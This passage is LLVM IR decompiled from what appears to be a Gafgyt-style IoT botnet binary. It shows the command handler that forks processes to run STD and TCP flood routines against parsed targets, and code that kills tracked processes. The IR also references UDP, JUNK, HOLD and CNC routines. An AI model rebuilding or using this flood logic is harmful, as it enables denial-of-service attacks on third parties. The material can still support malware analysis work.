dec_label_pc_1000c130:                            ; preds = %dec_label_pc_1000c124
  %v1_1000c134 = add i32 %tmp, 8
  %v1_1000c138 = inttoptr i32 %v1_1000c134 to i32*
  %v2_1000c138 = load i32, i32* %v1_1000c138, align 4
  store i32 268484932, i32* @lr, align 4
  %v2_1000c140 = call i32 @atol(i32 %v2_1000c138, i32 %v1_1000c134)
  %tmp130 = icmp slt i32 %v2_1000c140, 1
  br i1 %tmp130, label %dec_label_pc_1000c69c, label %dec_label_pc_1000c150

dec_label_pc_1000c150:                            ; preds = %dec_label_pc_1000c130
  %v1_1000c154 = add i32 %tmp, 12
  %v1_1000c158 = inttoptr i32 %v1_1000c154 to i32*
  %v2_1000c158 = load i32, i32* %v1_1000c158, align 4
  store i32 268484964, i32* @lr, align 4
  %v2_1000c160 = call i32 @atol(i32 %v2_1000c158, i32 %v1_1000c154)
  %v2_1000c168 = icmp sgt i32 %v2_1000c160, 0
  br i1 %v2_1000c168, label %dec_label_pc_1000c174, label %dec_label_pc_1000c69c

dec_label_pc_1000c174:                            ; preds = %dec_label_pc_1000c150
  %v1_1000c178 = add i32 %tmp, 4
  %v1_1000c17c = inttoptr i32 %v1_1000c178 to i32*
  %v2_1000c17c = load i32, i32* %v1_1000c17c, align 4
  %v2_1000c18c = load i32, i32* %v1_1000c138, align 4
  store i32 268485016, i32* @lr, align 4
  %v2_1000c194 = call i32 @atol(i32 %v2_1000c18c, i32 %v1_1000c134)
  %v2_1000c1a8 = load i32, i32* %v1_1000c158, align 4
  store i32 268485044, i32* @lr, align 4
  %v2_1000c1b0 = call i32 @atol(i32 %v2_1000c1a8, i32 %v1_1000c154)
  store i32 %v2_1000c17c, i32* @r3, align 4
  store i32 268485068, i32* @lr, align 4
  %v2_1000c1c8 = call i32 @__GI_strchr(i32 %v2_1000c17c, i32 44)
  %v3_1000c1d0 = icmp eq i32 %v2_1000c1c8, 0
  br i1 %v3_1000c1d0, label %dec_label_pc_1000c248, label %dec_label_pc_1000c1d8

dec_label_pc_1000c1d8:                            ; preds = %dec_label_pc_1000c174
  store i32 ptrtoint (i32* @global_var_10018d6c.470 to i32), i32* @r4, align 4
  store i32 268485100, i32* @lr, align 4
  %v3_1000c1e8 = call i32 @__GI_strtok(i32 %v2_1000c17c, i32 ptrtoint (i32* @global_var_10018d6c.470 to i32), i32 268566528)
  %v3_1000c23c35 = icmp eq i32 %v3_1000c1e8, 0
  br i1 %v3_1000c23c35, label %dec_label_pc_1000c270, label %dec_label_pc_1000c1f8

dec_label_pc_1000c1f8:                            ; preds = %dec_label_pc_1000c1d8, %dec_label_pc_1000c220
  %storemerge1636 = phi i32 [ %v3_1000c22c, %dec_label_pc_1000c220 ], [ %v3_1000c1e8, %dec_label_pc_1000c1d8 ]
  store i32 268485116, i32* @lr, align 4
  %v0_1000c1f8 = call i32 @listFork()
  %v3_1000c200 = icmp eq i32 %v0_1000c1f8, 0
  br i1 %v3_1000c200, label %dec_label_pc_1000c208, label %dec_label_pc_1000c220

dec_label_pc_1000c208:                            ; preds = %dec_label_pc_1000c1f8
  %v3_1000c214 = call i32 @sendSTD(i32 %storemerge1636, i32 %v2_1000c194, i32 %v2_1000c1b0)
  %v1_1000c21c = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_1000c220

dec_label_pc_1000c220:                            ; preds = %dec_label_pc_1000c1f8, %dec_label_pc_1000c208
  store i32 ptrtoint (i32* @global_var_10018d6c.470 to i32), i32* @r4, align 4
  store i32 268485168, i32* @lr, align 4
  %v3_1000c22c = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_10018d6c.470 to i32), i32 268566528)
  %v3_1000c23c = icmp eq i32 %v3_1000c22c, 0
  br i1 %v3_1000c23c, label %dec_label_pc_1000c270, label %dec_label_pc_1000c1f8

dec_label_pc_1000c248:                            ; preds = %dec_label_pc_1000c174
  store i32 268485196, i32* @lr, align 4
  %v0_1000c248 = call i32 @listFork()
  %v3_1000c250 = icmp eq i32 %v0_1000c248, 0
  br i1 %v3_1000c250, label %dec_label_pc_1000c258, label %dec_label_pc_1000c69c

dec_label_pc_1000c258:                            ; preds = %dec_label_pc_1000c248
  %v3_1000c264 = call i32 @sendSTD(i32 %v2_1000c17c, i32 %v2_1000c194, i32 %v2_1000c1b0)
  %v1_1000c26c = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_1000c270

dec_label_pc_1000c270:                            ; preds = %dec_label_pc_1000c220, %dec_label_pc_1000c1d8, %dec_label_pc_1000c100, %dec_label_pc_1000c258
  %v2_1000c274 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_10018e60.532 to i32), i32* @r4, align 4
  %v3_1000c284 = inttoptr i32 %v2_1000c274 to i8*
  %v4_1000c284 = call i32 @__GI_strcoll(i8* %v3_1000c284, i32 ptrtoint ([4 x i8]* @global_var_10018e60.532 to i32))
  %v3_1000c28c = icmp eq i32 %v4_1000c284, 0
  br i1 %v3_1000c28c, label %dec_label_pc_1000c294, label %dec_label_pc_1000c540

dec_label_pc_1000c294:                            ; preds = %dec_label_pc_1000c270
  %tmp131 = icmp slt i32 %arg1, 6
  br i1 %tmp131, label %dec_label_pc_1000c69c, label %dec_label_pc_1000c2a0

dec_label_pc_1000c2a0:                            ; preds = %dec_label_pc_1000c294
  %v1_1000c2a4 = add i32 %tmp, 12
  %v1_1000c2a8 = inttoptr i32 %v1_1000c2a4 to i32*
  %v2_1000c2a8 = load i32, i32* %v1_1000c2a8, align 4
  store i32 268485300, i32* @lr, align 4
  %v2_1000c2b0 = call i32 @atol(i32 %v2_1000c2a8, i32 %v1_1000c2a4)
  %v4_1000c2bc = icmp eq i32 %v2_1000c2b0, -1
  br i1 %v4_1000c2bc, label %dec_label_pc_1000c69c, label %dec_label_pc_1000c2c4

dec_label_pc_1000c2c4:                            ; preds = %dec_label_pc_1000c2a0
  %v1_1000c2c8 = add i32 %tmp, 8
  %v1_1000c2cc = inttoptr i32 %v1_1000c2c8 to i32*
  %v2_1000c2cc = load i32, i32* %v1_1000c2cc, align 4
  store i32 268485336, i32* @lr, align 4
  %v2_1000c2d4 = call i32 @atol(i32 %v2_1000c2cc, i32 %v1_1000c2c8)
  %v4_1000c2e0 = icmp eq i32 %v2_1000c2d4, -1
  br i1 %v4_1000c2e0, label %dec_label_pc_1000c69c, label %dec_label_pc_1000c2e8

dec_label_pc_1000c2e8:                            ; preds = %dec_label_pc_1000c2c4
  %v1_1000c2ec = add i32 %tmp, 16
  %v1_1000c2f0 = inttoptr i32 %v1_1000c2ec to i32*
  %v2_1000c2f0 = load i32, i32* %v1_1000c2f0, align 4
  store i32 268485372, i32* @lr, align 4
  %v2_1000c2f8 = call i32 @atol(i32 %v2_1000c2f0, i32 %v1_1000c2ec)
  %v4_1000c304 = icmp eq i32 %v2_1000c2f8, -1
  br i1 %v4_1000c304, label %dec_label_pc_1000c69c, label %dec_label_pc_1000c30c

dec_label_pc_1000c30c:                            ; preds = %dec_label_pc_1000c2e8
  %v2_1000c314 = load i32, i32* %v1_1000c2f0, align 4
  store i32 268485408, i32* @lr, align 4
  %v2_1000c31c = call i32 @atol(i32 %v2_1000c314, i32 %v1_1000c2ec)
  %v2_1000c324 = icmp sgt i32 %v2_1000c31c, 32
  br i1 %v2_1000c324, label %dec_label_pc_1000c69c, label %dec_label_pc_1000c32c

dec_label_pc_1000c32c:                            ; preds = %dec_label_pc_1000c30c
  %tmp132 = icmp slt i32 %arg1, 7
  br i1 %tmp132, label %dec_label_pc_1000c358, label %dec_label_pc_1000c338

dec_label_pc_1000c338:                            ; preds = %dec_label_pc_1000c32c
  %v1_1000c33c = add i32 %tmp, 24
  %v1_1000c340 = inttoptr i32 %v1_1000c33c to i32*
  %v2_1000c340 = load i32, i32* %v1_1000c340, align 4
  store i32 268485452, i32* @lr, align 4
  %v2_1000c348 = call i32 @atol(i32 %v2_1000c340, i32 %v1_1000c33c)
  %v1_1000c350 = icmp slt i32 %v2_1000c348, 0
  br i1 %v1_1000c350, label %dec_label_pc_1000c69c, label %dec_label_pc_1000c358

dec_label_pc_1000c358:                            ; preds = %dec_label_pc_1000c338, %dec_label_pc_1000c32c
  %v3_1000c35c = icmp eq i32 %arg1, 8
  br i1 %v3_1000c35c, label %dec_label_pc_1000c364, label %dec_label_pc_1000c388

dec_label_pc_1000c364:                            ; preds = %dec_label_pc_1000c358
  %v1_1000c368 = add i32 %tmp, 28
  %v1_1000c36c = inttoptr i32 %v1_1000c368 to i32*
  %v2_1000c36c = load i32, i32* %v1_1000c36c, align 4
  store i32 268485496, i32* @lr, align 4
  %v2_1000c374 = call i32 @atol(i32 %v2_1000c36c, i32 %v1_1000c368)
  %v2_1000c37c = icmp sgt i32 %v2_1000c374, 0
  br i1 %v2_1000c37c, label %dec_label_pc_1000c388, label %dec_label_pc_1000c69c

dec_label_pc_1000c388:                            ; preds = %dec_label_pc_1000c358, %dec_label_pc_1000c364
  %v1_1000c38c = add i32 %tmp, 4
  %v1_1000c390 = inttoptr i32 %v1_1000c38c to i32*
  %v2_1000c390 = load i32, i32* %v1_1000c390, align 4
  %v2_1000c3a0 = load i32, i32* %v1_1000c2cc, align 4
  store i32 268485548, i32* @lr, align 4
  %v2_1000c3a8 = call i32 @atol(i32 %v2_1000c3a0, i32 %v1_1000c2c8)
  %v2_1000c3bc = load i32, i32* %v1_1000c2a8, align 4
  store i32 268485576, i32* @lr, align 4
  %v2_1000c3c4 = call i32 @atol(i32 %v2_1000c3bc, i32 %v1_1000c2a4)
  %v2_1000c3d8 = load i32, i32* %v1_1000c2f0, align 4
  store i32 268485604, i32* @lr, align 4
  %v2_1000c3e0 = call i32 @atol(i32 %v2_1000c3d8, i32 %v1_1000c2ec)
  %v1_1000c3f0 = add i32 %tmp, 20
  %v1_1000c3f4 = inttoptr i32 %v1_1000c3f0 to i32*
  %v2_1000c3f4 = load i32, i32* %v1_1000c3f4, align 4
  br i1 %v3_1000c35c, label %dec_label_pc_1000c408, label %dec_label_pc_1000c424

dec_label_pc_1000c408:                            ; preds = %dec_label_pc_1000c388
  %v1_1000c40c = add i32 %tmp, 28
  %v1_1000c410 = inttoptr i32 %v1_1000c40c to i32*
  %v2_1000c410 = load i32, i32* %v1_1000c410, align 4
  store i32 268485660, i32* @lr, align 4
  %v2_1000c418 = call i32 @atol(i32 %v2_1000c410, i32 %v1_1000c40c)
  br label %dec_label_pc_1000c42c

dec_label_pc_1000c424:                            ; preds = %dec_label_pc_1000c388
  br label %dec_label_pc_1000c42c

dec_label_pc_1000c42c:                            ; preds = %dec_label_pc_1000c408, %dec_label_pc_1000c424
  %storemerge3 = phi i32 [ 10, %dec_label_pc_1000c424 ], [ %v2_1000c418, %dec_label_pc_1000c408 ]
  br i1 %tmp132, label %dec_label_pc_1000c45c, label %dec_label_pc_1000c440

dec_label_pc_1000c440:                            ; preds = %dec_label_pc_1000c42c
  %v1_1000c444 = add i32 %tmp, 24
  %v1_1000c448 = inttoptr i32 %v1_1000c444 to i32*
  %v2_1000c448 = load i32, i32* %v1_1000c448, align 4
  store i32 268485716, i32* @lr, align 4
  %v2_1000c450 = call i32 @atol(i32 %v2_1000c448, i32 %v1_1000c444)
  br label %dec_label_pc_1000c464

dec_label_pc_1000c45c:                            ; preds = %dec_label_pc_1000c42c
  br label %dec_label_pc_1000c464

dec_label_pc_1000c464:                            ; preds = %dec_label_pc_1000c440, %dec_label_pc_1000c45c
  %storemerge2 = phi i32 [ 0, %dec_label_pc_1000c45c ], [ %v2_1000c450, %dec_label_pc_1000c440 ]
  store i32 %v2_1000c390, i32* @r3, align 4
  store i32 268485756, i32* @lr, align 4
  %v2_1000c478 = call i32 @__GI_strchr(i32 %v2_1000c390, i32 44)
  %v3_1000c480 = icmp eq i32 %v2_1000c478, 0
  br i1 %v3_1000c480, label %dec_label_pc_1000c508, label %dec_label_pc_1000c488

dec_label_pc_1000c488:                            ; preds = %dec_label_pc_1000c464
  store i32 ptrtoint (i32* @global_var_10018d6c.470 to i32), i32* @r4, align 4
  store i32 268485788, i32* @lr, align 4
  %v3_1000c498 = call i32 @__GI_strtok(i32 %v2_1000c390, i32 ptrtoint (i32* @global_var_10018d6c.470 to i32), i32 268566528)
  %v3_1000c4fc31 = icmp eq i32 %v3_1000c498, 0
  br i1 %v3_1000c4fc31, label %dec_label_pc_1000c540, label %dec_label_pc_1000c4a8

dec_label_pc_1000c4a8:                            ; preds = %dec_label_pc_1000c488, %dec_label_pc_1000c4e0
  %storemerge1432 = phi i32 [ %v3_1000c4ec, %dec_label_pc_1000c4e0 ], [ %v3_1000c498, %dec_label_pc_1000c488 ]
  store i32 268485804, i32* @lr, align 4
  %v0_1000c4a8 = call i32 @listFork()
  %v3_1000c4b0 = icmp eq i32 %v0_1000c4a8, 0
  br i1 %v3_1000c4b0, label %dec_label_pc_1000c4b8, label %dec_label_pc_1000c4e0

dec_label_pc_1000c4b8:                            ; preds = %dec_label_pc_1000c4a8
  %v7_1000c4d4 = call i32 @sendTCP(i32 %storemerge1432, i32 %v2_1000c3a8, i32 %v2_1000c3c4, i32 %v2_1000c3e0, i32 %v2_1000c3f4, i32 %storemerge2, i32 %storemerge3)
  %v1_1000c4dc = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_1000c4e0

dec_label_pc_1000c4e0:                            ; preds = %dec_label_pc_1000c4a8, %dec_label_pc_1000c4b8
  store i32 ptrtoint (i32* @global_var_10018d6c.470 to i32), i32* @r4, align 4
  store i32 268485872, i32* @lr, align 4
  %v3_1000c4ec = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_10018d6c.470 to i32), i32 268566528)
  %v3_1000c4fc = icmp eq i32 %v3_1000c4ec, 0
  br i1 %v3_1000c4fc, label %dec_label_pc_1000c540, label %dec_label_pc_1000c4a8

dec_label_pc_1000c508:                            ; preds = %dec_label_pc_1000c464
  store i32 268485900, i32* @lr, align 4
  %v0_1000c508 = call i32 @listFork()
  %v3_1000c510 = icmp eq i32 %v0_1000c508, 0
  br i1 %v3_1000c510, label %dec_label_pc_1000c518, label %dec_label_pc_1000c69c

dec_label_pc_1000c518:                            ; preds = %dec_label_pc_1000c508
  %v7_1000c534 = call i32 @sendTCP(i32 %v2_1000c390, i32 %v2_1000c3a8, i32 %v2_1000c3c4, i32 %v2_1000c3e0, i32 %v2_1000c3f4, i32 %storemerge2, i32 %storemerge3)
  %v1_1000c53c = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_1000c540

dec_label_pc_1000c540:                            ; preds = %dec_label_pc_1000c4e0, %dec_label_pc_1000c488, %dec_label_pc_1000c270, %dec_label_pc_1000c518
  %v2_1000c544 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_10018e64.536 to i32), i32* @r4, align 4
  %v3_1000c554 = inttoptr i32 %v2_1000c544 to i8*
  %v4_1000c554 = call i32 @__GI_strcoll(i8* %v3_1000c554, i32 ptrtoint ([5 x i8]* @global_var_10018e64.536 to i32))
  %v3_1000c55c = icmp eq i32 %v4_1000c554, 0
  br i1 %v3_1000c55c, label %dec_label_pc_1000c564, label %dec_label_pc_1000c670

dec_label_pc_1000c564:                            ; preds = %dec_label_pc_1000c540
  br label %dec_label_pc_1000c608

dec_label_pc_1000c578:                            ; preds = %dec_label_pc_1000c608, %dec_label_pc_1000c650
  %v1_1000c57c = mul i32 %storemerge12, 4
  %v3_1000c588 = load i32, i32* @global_var_1002abdc.40, align 4
  %v2_1000c58c = add i32 %v3_1000c588, %v1_1000c57c
  %v1_1000c590 = inttoptr i32 %v2_1000c58c to i32*
  %v2_1000c590 = load i32, i32* %v1_1000c590, align 4
  %v3_1000c594 = icmp eq i32 %v2_1000c590, 0
  br i1 %v3_1000c594, label %dec_label_pc_1000c5fc, label %dec_label_pc_1000c59c

dec_label_pc_1000c59c:                            ; preds = %dec_label_pc_1000c578
  %v2_1000c5b4 = load i32, i32* %v1_1000c590, align 4
  store i32 268486076, i32* @lr, align 4
  %v0_1000c5b8 = call i32 @__libc_getpid()
  %v4_1000c5c0 = icmp eq i32 %v2_1000c5b4, %v0_1000c5b8
  br i1 %v4_1000c5c0, label %dec_label_pc_1000c5fc, label %dec_label_pc_1000c5c8

dec_label_pc_1000c5c8:                            ; preds = %dec_label_pc_1000c59c
  %v3_1000c5d8 = load i32, i32* @global_var_1002abdc.40, align 4
  %v2_1000c5dc = add i32 %v3_1000c5d8, %v1_1000c57c
  %v1_1000c5e0 = inttoptr i32 %v2_1000c5dc to i32*
  %v2_1000c5e0 = load i32, i32* %v1_1000c5e0, align 4
  store i32 268486128, i32* @lr, align 4
  %v2_1000c5ec = call i32 @kill(i32 %v2_1000c5e0, i32 9)
  %v1_1000c5f4 = add i32 %stack_var_-244.1, 1
  br label %dec_label_pc_1000c5fc

dec_label_pc_1000c5fc:                            ; preds = %dec_label_pc_1000c59c, %dec_label_pc_1000c578, %dec_label_pc_1000c5c8
  %stack_var_-244.0 = phi i32 [ %stack_var_-244.1, %dec_label_pc_1000c578 ], [ %stack_var_-244.1, %dec_label_pc_1000c59c ], [ %v1_1000c5f4, %dec_label_pc_1000c5c8 ]
  %v1_1000c600 = add i32 %storemerge12, 1
  br label %dec_label_pc_1000c608

dec_label_pc_1000c608:                            ; preds = %dec_label_pc_1000c564, %dec_label_pc_1000c5fc
  %stack_var_-244.1 = phi i32 [ 0, %dec_label_pc_1000c564 ], [ %stack_var_-244.0, %dec_label_pc_1000c5fc ]
  %storemerge12 = phi i32 [ 0, %dec_label_pc_1000c564 ], [ %v1_1000c600, %dec_label_pc_1000c5fc ]
  %v2_1000c630 = load i32, i32* @global_var_1002abb0.38, align 4
  %v3_1000c648 = icmp eq i32 %v2_1000c630, 0
  br i1 %v3_1000c648, label %dec_label_pc_1000c650, label %dec_label_pc_1000c578

dec_label_pc_1000c650:                            ; preds = %dec_label_pc_1000c608
  %v3_1000c634 = load i32, i32* @global_var_1002abb4.39, align 4
  %v3_1000c668 = icmp ugt i32 %v3_1000c634, %storemerge12
  br i1 %v3_1000c668, label %dec_label_pc_1000c578, label %dec_label_pc_1000c670

dec_label_pc_1000c670:                            ; preds = %dec_label_pc_1000c650, %dec_label_pc_1000c540
  %v2_1000c674 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([12 x i8]* @global_var_10018e6c.537 to i32), i32* @r4, align 4
  %v3_1000c684 = inttoptr i32 %v2_1000c674 to i8*
  %v4_1000c684 = call i32 @__GI_strcoll(i8* %v3_1000c684, i32 ptrtoint ([12 x i8]* @global_var_10018e6c.537 to i32))
  %v3_1000c68c = icmp eq i32 %v4_1000c684, 0
  br i1 %v3_1000c68c, label %dec_label_pc_1000c694, label %dec_label_pc_1000c69c

dec_label_pc_1000c694:                            ; preds = %dec_label_pc_1000c670
  %v0_1000c698 = call i32 @__GI_exit()
  br label %dec_label_pc_1000c69c

dec_label_pc_1000c69c:                            ; preds = %dec_label_pc_1000c364, %dec_label_pc_1000c150, %dec_label_pc_1000bf90, %dec_label_pc_1000be10, %dec_label_pc_1000ba14, %dec_label_pc_1000b7d0, %dec_label_pc_1000b660, %dec_label_pc_1000b758, %dec_label_pc_1000b8d8, %dec_label_pc_1000bb88, %dec_label_pc_1000bd10, %dec_label_pc_1000bf18, %dec_label_pc_1000c0b8, %dec_label_pc_1000c248, %dec_label_pc_1000c508, %dec_label_pc_1000c670, %dec_label_pc_1000b5b4, %dec_label_pc_1000b53c, %dec_label_pc_1000c338, %dec_label_pc_1000c30c, %dec_label_pc_1000c2e8, %dec_label_pc_1000c2c4, %dec_label_pc_1000c2a0, %dec_label_pc_1000c294, %dec_label_pc_1000c130, %dec_label_pc_1000c124, %dec_label_pc_1000b7b0, %dec_label_pc_1000b7a4, %dec_label_pc_1000b640, %dec_label_pc_1000b634, %dec_label_pc_1000b4c8, %dec_label_pc_1000bf70, %dec_label_pc_1000bf64, %dec_label_pc_1000bdf0, %dec_label_pc_1000bde4, %dec_label_pc_1000bbe0, %dec_label_pc_1000b9e8, %dec_label_pc_1000b9c0, %dec_label_pc_1000b99c, %dec_label_pc_1000b978, %dec_label_pc_1000b954, %dec_label_pc_1000b930, %dec_label_pc_1000b924, %dec_label_pc_1000b564, %dec_label_pc_1000b480, %dec_label_pc_1000b354, %dec_label_pc_1000b310, %dec_label_pc_1000c694
  %v0_1000c6c4 = phi i32 [ %v2_1000c374, %dec_label_pc_1000c364 ], [ %v2_1000c160, %dec_label_pc_1000c150 ], [ %v2_1000bfa0, %dec_label_pc_1000bf90 ], [ %v2_1000be20, %dec_label_pc_1000be10 ], [ %v2_1000ba24, %dec_label_pc_1000ba14 ], [ %v2_1000b7e0, %dec_label_pc_1000b7d0 ], [ %v2_1000b670, %dec_label_pc_1000b660 ], [ %v0_1000b758, %dec_label_pc_1000b758 ], [ %v0_1000b8d8, %dec_label_pc_1000b8d8 ], [ %v0_1000bb88, %dec_label_pc_1000bb88 ], [ %v0_1000bd10, %dec_label_pc_1000bd10 ], [ %v0_1000bf18, %dec_label_pc_1000bf18 ], [ %v0_1000c0b8, %dec_label_pc_1000c0b8 ], [ %v0_1000c248, %dec_label_pc_1000c248 ], [ %v0_1000c508, %dec_label_pc_1000c508 ], [ %v4_1000c684, %dec_label_pc_1000c670 ], [ 0, %dec_label_pc_1000b5b4 ], [ 0, %dec_label_pc_1000b53c ], [ %v2_1000c348, %dec_label_pc_1000c338 ], [ %v2_1000c31c, %dec_label_pc_1000c30c ], [ -1, %dec_label_pc_1000c2e8 ], [ -1, %dec_label_pc_1000c2c4 ], [ -1, %dec_label_pc_1000c2a0 ], [ 0, %dec_label_pc_1000c294 ], [ %v2_1000c140, %dec_label_pc_1000c130 ], [ 0, %dec_label_pc_1000c124 ], [ %v2_1000b7c0, %dec_label_pc_1000b7b0 ], [ 0, %dec_label_pc_1000b7a4 ], [ %v2_1000b650, %dec_label_pc_1000b640 ], [ 0, %dec_label_pc_1000b634 ], [ 0, %dec_label_pc_1000b4c8 ], [ %v2_1000bf80, %dec_label_pc_1000bf70 ], [ 0, %dec_label_pc_1000bf64 ], [ %v2_1000be00, %dec_label_pc_1000bdf0 ], [ 0, %dec_label_pc_1000bde4 ], [ 0, %dec_label_pc_1000bbe0 ], [ %v2_1000b9f8, %dec_label_pc_1000b9e8 ], [ %v2_1000b9d0, %dec_label_pc_1000b9c0 ], [ -1, %dec_label_pc_1000b99c ], [ -1, %dec_label_pc_1000b978 ], [ -1, %dec_label_pc_1000b954 ], [ -1, %dec_label_pc_1000b930 ], [ 0, %dec_label_pc_1000b924 ], [ %v0_1000b54c, %dec_label_pc_1000b564 ], [ %v4_1000b498, %dec_label_pc_1000b480 ], [ %v5_1000b38c, %dec_label_pc_1000b354 ], [ %v4_1000b328, %dec_label_pc_1000b310 ], [ %v0_1000c698, %dec_label_pc_1000c694 ]
  ret i32 %v0_1000c6c4

; uselistorder directives
  uselistorder i32 %storemerge12, { 1, 0, 2 }
  uselistorder i32 %stack_var_-244.1, { 0, 2, 1 }
  uselistorder i32 %v1_1000c57c, { 1, 0 }
  uselistorder i32 %v3_1000c4ec, { 1, 0 }
  uselistorder i32 %storemerge2, { 1, 0 }
  uselistorder i32 %storemerge3, { 1, 0 }
  uselistorder i32 %v2_1000c3f4, { 1, 0 }
  uselistorder i32 %v2_1000c3e0, { 1, 0 }
  uselistorder i32 %v2_1000c3c4, { 1, 0 }
  uselistorder i32 %v2_1000c3a8, { 1, 0 }
  uselistorder i32 %v2_1000c390, { 1, 0, 3, 2 }
  uselistorder i32 %v3_1000c22c, { 1, 0 }
  uselistorder i32 %v2_1000c1b0, { 1, 0 }
  uselistorder i32 %v2_1000c194, { 1, 0 }
  uselistorder i32 %v2_1000c17c, { 1, 0, 3, 2 }
  uselistorder i32 %v3_1000c09c, { 1, 0 }
  uselistorder i32 %storemerge1840, { 2, 1, 0 }
  uselistorder i32 %v2_1000bff0, { 3, 4, 5, 0, 1, 2 }
  uselistorder i32 %v2_1000bfd4, { 3, 4, 5, 0, 1, 2 }
  uselistorder i32 %v2_1000bfbc, { 1, 2, 3, 0, 5, 4 }
  uselistorder i32 %v3_1000befc, { 1, 0 }
  uselistorder i32 %v2_1000be70, { 1, 0 }
  uselistorder i32 %v2_1000be54, { 1, 0 }
  uselistorder i32 %v2_1000be3c, { 1, 0, 3, 2 }
  uselistorder i32* %v1_1000bbf4, { 2, 0, 1, 3 }
  uselistorder i32 %v3_1000bb6c, { 1, 0 }
  uselistorder i32 %storemerge9, { 1, 0 }
  uselistorder i32 %v2_1000baac, { 1, 0 }
  uselistorder i32 %v2_1000ba90, { 1, 0 }
  uselistorder i32 %v2_1000ba74, { 1, 0 }
  uselistorder i32 %v2_1000ba58, { 1, 0 }
  uselistorder i32 %v2_1000ba40, { 1, 0, 3, 2 }
  uselistorder i32 %v3_1000b8bc, { 1, 0 }
  uselistorder i32 %v2_1000b830, { 1, 0 }
  uselistorder i32 %v2_1000b814, { 1, 0 }
  uselistorder i32 %v2_1000b7fc, { 1, 0, 3, 2 }
  uselistorder i32 %v3_1000b73c, { 1, 0 }
  uselistorder i32 %v2_1000b6c0, { 1, 0 }
  uselistorder i32 %v2_1000b6a4, { 1, 0 }
  uselistorder i32 %v2_1000b68c, { 1, 0, 3, 2 }
  uselistorder i32 %tmp, { 4, 5, 6, 7, 8, 3, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 0, 1, 2, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @sendTCP, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @sendSTD, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @sendCNC, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @sendUDP, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @sendJUNK, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @sendHOLD, { 3, 0, 2, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_10018d6c.470 to i32), { 7, 18, 8, 19, 6, 20, 9, 21, 5, 22, 10, 23, 4, 24, 11, 25, 3, 26, 12, 27, 2, 28, 13, 29, 1, 30, 14, 31, 0, 32, 15, 33, 16, 34, 17, 35 }
  uselistorder i32 ptrtoint ([3 x i8]* @global_var_10018e0c.499 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_10016314.31 to i32), { 0, 2, 1 }
  uselistorder label %dec_label_pc_1000c69c, { 47, 15, 14, 0, 18, 19, 20, 21, 22, 23, 13, 1, 24, 25, 12, 2, 31, 32, 11, 3, 33, 34, 10, 35, 9, 4, 36, 37, 38, 39, 40, 41, 42, 8, 5, 26, 27, 7, 6, 28, 29, 16, 43, 17, 30, 44, 45, 46 }
  uselistorder label %dec_label_pc_1000c608, { 1, 0 }
  uselistorder label %dec_label_pc_1000c5fc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000c578, { 1, 0 }
  uselistorder label %dec_label_pc_1000c540, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000c4e0, { 1, 0 }
  uselistorder label %dec_label_pc_1000c4a8, { 1, 0 }
  uselistorder label %dec_label_pc_1000c464, { 1, 0 }
  uselistorder label %dec_label_pc_1000c42c, { 1, 0 }
  uselistorder label %dec_label_pc_1000c388, { 1, 0 }
  uselistorder label %dec_label_pc_1000c270, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000c220, { 1, 0 }
  uselistorder label %dec_label_pc_1000c1f8, { 1, 0 }
  uselistorder label %dec_label_pc_1000c100, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000c090, { 1, 0 }
  uselistorder label %dec_label_pc_1000c038, { 1, 0 }
  uselistorder label %dec_label_pc_1000bf40, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000bef0, { 1, 0 }
  uselistorder label %dec_label_pc_1000beb8, { 1, 0 }
  uselistorder label %dec_label_pc_1000bdc0, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000bce8, { 1, 0 }
  uselistorder label %dec_label_pc_1000bc38, { 1, 0 }
  uselistorder label %dec_label_pc_1000bbbc, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000bb60, { 1, 0 }
  uselistorder label %dec_label_pc_1000bb2c, { 1, 0 }
  uselistorder label %dec_label_pc_1000bae8, { 1, 0 }
  uselistorder label %dec_label_pc_1000ba38, { 1, 0 }
  uselistorder label %dec_label_pc_1000b900, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000b8b0, { 1, 0 }
  uselistorder label %dec_label_pc_1000b878, { 1, 0 }
  uselistorder label %dec_label_pc_1000b780, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000b730, { 1, 0 }
  uselistorder label %dec_label_pc_1000b708, { 1, 0 }
  uselistorder label %dec_label_pc_1000b610, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000b590, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000b514, { 1, 0 }
  uselistorder label %dec_label_pc_1000b450, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000b3f4, { 2, 0, 1 }
}

define i32 @initConnection() local_unnamed_addr {
entry:
  %stack_var_-4132 = alloca i32, align 4
  %v2_1000c6dc = ptrtoint i32* %stack_var_-4132 to i32
  store i32 268486388, i32* @lr, align 4
  %v3_1000c6f0 = call i32 @__GI_memset(i32 %v2_1000c6dc, i32 0, i32 4096)
  %v3_1000c6f8 = load i32, i32* @global_var_1002aba8.30, align 4
  %v3_1000c6fc = icmp eq i32 %v3_1000c6f8, 0
